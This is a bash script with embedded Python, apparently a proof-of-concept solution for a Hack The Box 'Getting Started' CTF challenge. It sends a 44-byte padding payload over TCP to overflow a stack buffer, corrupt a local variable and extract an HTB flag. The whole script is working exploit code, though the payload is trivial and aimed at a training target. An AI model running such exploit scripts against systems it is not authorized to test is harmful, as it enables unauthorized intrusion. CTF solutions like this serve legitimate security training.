#!/usr/bin/env bash

set -euo pipefail

# -----------------------------------------------------------------------------
# PoC: Hack The Box - Getting Started
# Type: Stack buffer overflow -> local variable corruption -> win() path
#
# This script is intended for authorized CTF infrastructure only.
# -----------------------------------------------------------------------------

readonly SCRIPT_NAME="$(basename "$0")"
readonly DEFAULT_TIMEOUT=5
readonly DEFAULT_PAYLOAD_LEN=44

HOST=""
PORT=""
TIMEOUT="${DEFAULT_TIMEOUT}"
PAYLOAD_LEN="${DEFAULT_PAYLOAD_LEN}"
JSON_OUTPUT=0
VERBOSE=0

usage() {
  cat <<USAGE
Usage:
  ${SCRIPT_NAME} <host> <port>
  ${SCRIPT_NAME} --host <host> --port <port> [options]

Options:
  --host <host>            Target host/IP
  --port <port>            Target TCP port
  --timeout <seconds>      Socket timeout (default: ${DEFAULT_TIMEOUT})
  --length <bytes>         Payload length (default: ${DEFAULT_PAYLOAD_LEN})
  --json                   Print result as JSON
  --verbose                Enable debug output
  -h, --help               Show this help message

Exit codes:
  0  Success (flag extracted)
  1  Generic failure
  2  Invalid arguments
  3  Connectivity/request failure
  4  Exploit sent but flag not found
USAGE
}

log_info() {
  if [[ "${JSON_OUTPUT}" -eq 0 ]]; then
    printf '[*] %s\n' "$*" >&2
  fi
}

log_debug() {
  if [[ "${VERBOSE}" -eq 1 && "${JSON_OUTPUT}" -eq 0 ]]; then
    printf '[D] %s\n' "$*" >&2
  fi
}

log_error() {
  printf '[-] %s\n' "$*" >&2
}

parse_args() {
  local positional=()

  while [[ $# -gt 0 ]]; do
    case "$1" in
      --host)
        HOST="${2:-}"
        shift 2
        ;;
      --port)
        PORT="${2:-}"
        shift 2
        ;;
      --timeout)
        TIMEOUT="${2:-}"
        shift 2
        ;;
      --length)
        PAYLOAD_LEN="${2:-}"
        shift 2
        ;;
      --json)
        JSON_OUTPUT=1
        shift
        ;;
      --verbose)
        VERBOSE=1
        shift
        ;;
      -h|--help)
        usage
        exit 0
        ;;
      -*)
        log_error "Unknown option: $1"
        usage >&2
        exit 2
        ;;
      *)
        positional+=("$1")
        shift
        ;;
    esac
  done

  if [[ -z "${HOST}" && ${#positional[@]} -ge 1 ]]; then
    HOST="${positional[0]}"
  fi
  if [[ -z "${PORT}" && ${#positional[@]} -ge 2 ]]; then
    PORT="${positional[1]}"
  fi

  if [[ -z "${HOST}" || -z "${PORT}" ]]; then
    log_error "Host and port are required."
    usage >&2
    exit 2
  fi

  if ! [[ "${PORT}" =~ ^[0-9]+$ ]] || (( PORT < 1 || PORT > 65535 )); then
    log_error "Invalid port: ${PORT}"
    exit 2
  fi

  if ! [[ "${PAYLOAD_LEN}" =~ ^[0-9]+$ ]] || (( PAYLOAD_LEN < 41 || PAYLOAD_LEN > 4096 )); then
    log_error "Invalid payload length: ${PAYLOAD_LEN} (expected integer 41..4096)"
    exit 2
  fi
}

main() {
  parse_args "$@"

  log_info "Target: ${HOST}:${PORT}"
  log_debug "Using payload length ${PAYLOAD_LEN} to overflow buffer and corrupt target"

  python3 - "$HOST" "$PORT" "$TIMEOUT" "$PAYLOAD_LEN" "$JSON_OUTPUT" "$VERBOSE" <<'PY'
import json
import re
import socket
import sys

host = sys.argv[1]
port = int(sys.argv[2])
timeout = float(sys.argv[3])
payload_len = int(sys.argv[4])
json_output = sys.argv[5] == "1"
verbose = sys.argv[6] == "1"


def emit_debug(msg: str) -> None:
    if verbose and not json_output:
        print(f"[D] {msg}", file=sys.stderr)


def fail(code: int, msg: str) -> None:
    if json_output:
        print(json.dumps({"ok": False, "error": msg, "target": f"{host}:{port}"}))
    else:
        print(f"[-] {msg}", file=sys.stderr)
    raise SystemExit(code)


payload = b"A" * payload_len + b"\n"
emit_debug(f"Payload bytes: {len(payload)}")

try:
    sock = socket.create_connection((host, port), timeout=timeout)
except Exception as exc:
    fail(3, f"Connection failed: {exc}")

try:
    sock.settimeout(timeout)

    # Receive initial banner best-effort; exploit still works if this times out.
    try:
        banner = sock.recv(16384)
        emit_debug(f"Initial banner bytes: {len(banner)}")
    except Exception:
        emit_debug("No initial banner received before timeout")

    sock.sendall(payload)

    chunks = []
    while True:
        try:
            data = sock.recv(4096)
        except socket.timeout:
            break
        if not data:
            break
        chunks.append(data)
finally:
    sock.close()

text = b"".join(chunks).decode("latin1", errors="ignore")
match = re.search(r"HTB\{[^}]+\}", text)

if not match:
    if verbose and not json_output:
        print("[D] Response preview:", file=sys.stderr)
        print(text[:700], file=sys.stderr)
    fail(4, "Flag pattern not found in target response")

flag = match.group(0)

if json_output:
    print(json.dumps({"ok": True, "target": f"{host}:{port}", "flag": flag}))
else:
    print(flag)
PY
}

main "$@"
